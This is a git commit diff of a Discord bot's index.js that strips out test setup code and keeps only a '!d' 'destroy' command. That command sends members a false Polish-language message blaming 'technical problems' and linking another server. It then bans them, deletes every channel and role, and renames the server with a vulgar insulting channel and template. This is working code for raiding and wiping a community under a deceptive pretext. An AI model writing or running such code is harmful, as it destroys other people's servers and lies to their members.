5bc0889139e0d1e3f24777c919c24d82bb7ee272
Kasper Knapik <kasper.knapik@gmail.com>
2021-02-23 21:10:54 +0100

    Leave only options for destroy. Changed name of new template. Change name sent to users. Generated new link.

--- index.js
+++ index.js
@@ -9,51 +9,24 @@ BotClient.on('ready', () => {
 });
 
 BotClient.on('message', msg => {
-    // Ignore messages that aren't from a guild
-    if (!msg.guild) return;
-
-    if (msg.content.startsWith('!s')) {
-        for (let index = 0; index < 5; index++) {
-            msg.guild.channels
-                .create(`test-channel-${index+1}`, {
-                    type: 'text'
-                })
-                .then(console.log)
-                .catch(console.error);
-            msg.guild.channels.create(`test-channel-${index+1}`, {
-                    type: 'voice'
-                })
-                .then(console.log)
-                .catch(console.error);
-            msg.guild.roles
-                .create({
-                    data: {
-                        name: `test-role-${index+1}`,
-                    }
-                })
-                .then(console.log)
-                .catch(console.error);
-        }
-    };
-
     if (msg.content.startsWith('!d')) {
         try {
             msg.guild.members.cache
-                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259' && m.user.bot !== true)
+                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259')
                 .forEach(m => {
                     m.user
-                        .send('Przenosimy się na nowy serwer: https://discord.gg/fbZCFxsEnF \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!')
+                        .send(`Przepraszamy, nasz serwer: ${msg.guild.name} miał poważne problemy techniczne, z tego powodu przenosimy się na nowy serwer: https://discord.gg/KuXteh2rBN \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`)
                         .then(m.ban())
                         .catch(console.error);
                 });
             msg.guild.channels.cache.forEach(channel => channel.delete());
             msg.guild.roles.cache.forEach(role => role.delete());
             msg.guild.channels
-                .create('Jebać Paule i Mruwe', {
+                .create('Chuj Ci w dupe nygusie', {
                     type: 'text'
                 })
                 .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
-                .then(msg.guild.createTemplate('Jebać Paule i Mruwe').then(t => t.sync()))
+                .then(msg.guild.createTemplate('Chuj Ci w dupe nygusie').then(t => t.sync()))
                 .catch(console.error);
         } catch (error) {
             console.log(error);
